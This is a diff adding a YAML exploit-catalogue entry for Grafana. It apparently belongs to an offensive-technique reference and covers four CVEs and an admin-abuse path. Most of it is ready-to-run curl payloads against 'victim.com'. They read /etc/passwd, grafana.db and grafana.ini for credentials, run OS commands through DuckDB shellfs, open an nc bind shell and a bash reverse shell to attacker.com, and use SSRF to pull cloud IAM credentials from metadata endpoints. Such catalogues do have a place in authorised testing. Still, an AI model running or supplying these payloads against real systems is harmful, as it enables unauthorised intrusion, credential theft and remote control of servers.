@@ -1,0 +1,220 @@
+---
+comment: "Grafana is an open-source analytics and monitoring platform. Three primary\
+  \ exploitation\npaths exist:\n\n1. CVE-2021-43798 (unauthenticated) \u2014 path\
+  \ traversal via the plugin static file serving\n   endpoint. Any plugin ID can be\
+  \ used (e.g., alertlist). Allows reading arbitrary files\n   from the Grafana server\
+  \ with the permissions of the grafana-server process.\n   Affects Grafana 8.0.0-beta1\
+  \ through 8.3.0.\n\n2. CVE-2024-9264 (authenticated, viewer+) \u2014 SQL Expressions\
+  \ feature using DuckDB evaluates\n   user-supplied SQL without sanitisation. The\
+  \ DuckDB `shellfs` extension can execute OS\n   commands if the DuckDB binary is\
+  \ on the server's PATH. Requires SQL Expressions feature\n   to be enabled (experimental,\
+  \ disabled by default in most installs).\n   Affects Grafana < 11.0.6+security-01\
+  \ / < 11.1.7+security-01 / < 11.2.2+security-01.\n\n3. CVE-2020-13379 (unauthenticated)\
+  \ \u2014 SSRF via the /avatar/ endpoint, which proxies\n   requests to any URL including\
+  \ cloud metadata endpoints.\n   Affects Grafana 3.0.1 through 7.0.2.\n\nA fourth\
+  \ vector (admin): configuring a MSSQL data source allows executing xp_cmdshell\n\
+  OS commands if the linked SQL Server has it enabled.\n"
+functions:
+  bind-shell:
+  - blind: true
+    code: |
+      COOKIE=$(curl -s -c - -X POST 'http://victim.com:3000/login' \
+        -H 'Content-Type: application/json' \
+        -d '{"user":"viewer","password":"viewer"}' | grep grafana_session | awk '{print $7}')
+
+      curl -s -X POST 'http://victim.com:3000/api/ds/query' \
+        -H 'Content-Type: application/json' \
+        -H "Cookie: grafana_session=${COOKIE}" \
+        -d '{
+          "queries": [{
+            "refId": "A",
+            "datasource": {"type": "grafana-testdata-datasource"},
+            "scenarioId": "csv_content",
+            "csvContent": "a\n1",
+            "rawSql": "INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv(\"/dev/stdin\", auto_detect=true, sample_size=1) WITH (PROGRAM=\"nc -lvp 12345 -e /bin/sh\")",
+            "format": "table"
+          }]
+        }'
+    comment: |
+      CVE-2024-9264: opens a bind shell on TCP port 12345 via the DuckDB shellfs extension.
+      The API request returns immediately (DuckDB runs nc asynchronously via shellfs).
+      Connect from the attacker with: nc victim.com 12345
+      Requires SQL Expressions enabled and DuckDB on PATH (see rce entry).
+      Inbound firewall rules on the Grafana host may block the port.
+    connector: tcp-client
+    contexts:
+      authenticated:
+    tty: false
+    version: |-
+      < 11.0.6 / < 11.1.7 / < 11.2.2
+  file-read:
+  - code: |
+      # Read /etc/passwd
+      curl -s --path-as-is 'http://victim.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
+
+      # Read Grafana database (contains hashed passwords and data source credentials)
+      curl -s --path-as-is 'http://victim.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
+
+      # Read Grafana config (contains secret_key, database DSN, SMTP credentials)
+      curl -s --path-as-is 'http://victim.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'
+    comment: "CVE-2021-43798: Grafana's plugin static file endpoint does not sanitise\
+      \ the path.\nAny installed plugin ID works as the prefix (alertlist, graph,\
+      \ table, etc.).\nThe traversal depth must reach the filesystem root \u2014 adjust\
+      \ the number of /../ sequences\nto match the Grafana installation depth (8 levels\
+      \ covers most default installs).\n\ngrafana.db is a SQLite database. Extract\
+      \ credentials with:\n  sqlite3 grafana.db \"SELECT login,email,password,salt\
+      \ FROM user;\"\n  sqlite3 grafana.db \"SELECT name,type,json_data,secure_json_data\
+      \ FROM data_source;\"\nsecure_json_data values are encrypted with the secret_key\
+      \ from grafana.ini.\n\nRef: https://www.exploit-db.com/exploits/50581\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      8.0.0-beta1 - 8.3.0
+  rce:
+  - blind: false
+    code: |
+      # Step 1: authenticate and obtain a session cookie (viewer account is sufficient)
+      COOKIE=$(curl -s -c - -X POST 'http://victim.com:3000/login' \
+        -H 'Content-Type: application/json' \
+        -d '{"user":"viewer","password":"viewer"}' | grep grafana_session | awk '{print $7}')
+
+      # Step 2: create a panel with a SQL Expression using DuckDB shellfs to execute a command
+      # POST to a dashboard save endpoint or use the Explore panel; the query below
+      # is sent to the /api/ds/query endpoint with the sql-ds-express datasource type:
+      curl -s -X POST 'http://victim.com:3000/api/ds/query' \
+        -H 'Content-Type: application/json' \
+        -H "Cookie: grafana_session=${COOKIE}" \
+        -d '{
+          "queries": [{
+            "refId": "A",
+            "datasource": {"type": "grafana-testdata-datasource"},
+            "scenarioId": "csv_content",
+            "csvContent": "a\n1",
+            "rawSql": "INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv(\"/dev/stdin\", auto_detect=true, sample_size=1) WITH (PROGRAM=\"id\")",
+            "format": "table"
+          }]
+        }'
+    comment: |
+      CVE-2024-9264: The SQL Expressions feature passes user-supplied SQL to DuckDB without
+      sanitisation. The DuckDB shellfs extension allows reading command output as a virtual
+      file, effectively executing arbitrary OS commands.
+
+      Prerequisites:
+      - SQL Expressions feature enabled (set feature_toggles.sqlExpressions = true in grafana.ini)
+      - DuckDB binary available on the Grafana server PATH
+      - Any authenticated account (viewer privileges are sufficient)
+
+      Command output is returned in the query response JSON under results.A.frames.
+      Ref: https://github.com/advisories/GHSA-49qr-ph23-6g7x
+    contexts:
+      authenticated:
+    version: |-
+      < 11.0.6 / < 11.1.7 / < 11.2.2
+  - blind: false
+    code: |
+      # Configure a MSSQL data source pointing to an attacker-controlled or internal SQL Server
+      # with xp_cmdshell enabled, then run a query:
+      curl -s -X POST 'http://victim.com:3000/api/datasources' \
+        -H 'Content-Type: application/json' \
+        -u 'admin:admin' \
+        -d '{
+          "name": "mssql-rce",
+          "type": "mssql",
+          "url": "attacker.com:1433",
+          "database": "master",
+          "user": "sa",
+          "secureJsonData": {"password": "Password1!"}
+        }'
+
+      # Query xp_cmdshell via the Explore UI or API:
+      # EXEC xp_cmdshell 'id'
+    comment: |
+      Admin-configured MSSQL data source: if the connected SQL Server has xp_cmdshell enabled
+      (EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;), Grafana's query passthrough allows
+      executing OS commands on the database server host.
+
+      This requires admin credentials to create the data source, or access to an existing
+      MSSQL data source that points to a server with xp_cmdshell enabled.
+      Command output is returned inline in the Grafana Explore panel response.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: "# Same CVE-2024-9264 SQL injection path \u2014 replace the shellfs program\
+      \ with a reverse shell\nCOOKIE=$(curl -s -c - -X POST 'http://victim.com:3000/login'\
+      \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"user\":\"viewer\",\"\
+      password\":\"viewer\"}' | grep grafana_session | awk '{print $7}')\n\ncurl -s\
+      \ -X POST 'http://victim.com:3000/api/ds/query' \\\n  -H 'Content-Type: application/json'\
+      \ \\\n  -H \"Cookie: grafana_session=${COOKIE}\" \\\n  -d '{\n    \"queries\"\
+      : [{\n      \"refId\": \"A\",\n      \"datasource\": {\"type\": \"grafana-testdata-datasource\"\
+      },\n      \"scenarioId\": \"csv_content\",\n      \"csvContent\": \"a\\n1\"\
+      ,\n      \"rawSql\": \"INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv(\\\
+      \"/dev/stdin\\\", auto_detect=true, sample_size=1) WITH (PROGRAM=\\\"bash -c\
+      \ '\\''bash -i >& /dev/tcp/attacker.com/12345 0>&1'\\''\\\")\",\n      \"format\"\
+      : \"table\"\n    }]\n  }'\n"
+    comment: "CVE-2024-9264: spawns a reverse bash shell via the DuckDB shellfs extension.\n\
+      The shell runs as the grafana-server process user (typically grafana or root\
+      \ in containers).\nThe HTTP response will not contain output \u2014 check the\
+      \ listener for the incoming connection.\nRequires SQL Expressions enabled and\
+      \ DuckDB on PATH (see rce entry).\n"
+    contexts:
+      authenticated:
+    listener: tcp-server
+    tty: false
+    version: |-
+      < 11.0.6 / < 11.1.7 / < 11.2.2
+  ssrf:
+  - code: |
+      # Probe cloud metadata endpoint (AWS IMDSv1)
+      curl -s 'http://victim.com:3000/avatar/$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"169.254.169.254/latest/meta-data/iam/security-credentials/\"))")'
+
+      # Direct URL-encoded request:
+      curl -s 'http://victim.com:3000/avatar/169.254.169.254%2flatest%2fmeta-data%2fiam%2fsecurity-credentials%2f'
+
+      # Probe internal services
+      curl -s 'http://victim.com:3000/avatar/192.168.1.1%2fadmin'
+    comment: |
+      CVE-2020-13379: The /avatar/<hash> endpoint fetches a remote URL to retrieve a user
+      avatar image. The hash parameter is not validated and can be any URL path segment that
+      Grafana will proxy as an HTTP GET request to https://secure.gravatar.com/<value>.
+      By encoding slashes (%2f), the request is redirected to an arbitrary URL.
+
+      Grafana's response proxies the content of the internal request, making this a blind-to-
+      semi-blind SSRF: HTTP status codes and partial body content are reflected.
+
+      On AWS/GCP/Azure cloud instances, target the metadata endpoint to retrieve IAM credentials:
+      - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      - GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+      Ref: https://www.exploit-db.com/exploits/49364
+    contexts:
+      unauthenticated:
+    version: |-
+      3.0.1 - 7.0.2
+  - code: |
+      # Configure a data source URL pointing to an internal service
+      curl -s -X POST 'http://victim.com:3000/api/datasources' \
+        -H 'Content-Type: application/json' \
+        -u 'admin:admin' \
+        -d '{
+          "name": "ssrf-probe",
+          "type": "prometheus",
+          "url": "http://169.254.169.254/latest/meta-data/",
+          "access": "proxy"
+        }'
+
+      # Trigger a query against the data source to observe the response
+      curl -s 'http://victim.com:3000/api/datasources/proxy/1/api/v1/query?query=up' \
+        -u 'admin:admin'
+    comment: |
+      Admin data source SSRF: any data source type with "access: proxy" causes Grafana to
+      proxy HTTP requests to the configured URL on behalf of the user. Setting the URL to an
+      internal endpoint (metadata service, internal API, Redis, Elasticsearch) allows probing
+      the internal network from the Grafana server.
+
+      The proxy endpoint at /api/datasources/proxy/<id>/<path> forwards arbitrary path
+      suffixes to the base URL, enabling full path traversal of the target service.
+    contexts:
+      admin:
+...
